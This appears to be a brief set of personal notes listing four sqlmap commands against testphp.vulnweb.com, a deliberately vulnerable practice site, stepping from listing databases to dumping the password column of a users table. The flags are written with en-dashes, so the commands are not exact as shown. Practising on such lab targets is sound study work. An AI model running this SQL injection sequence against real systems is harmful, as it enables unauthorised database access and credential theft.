# commandos

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 –dbs

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –tables

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –columns

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass –dump 
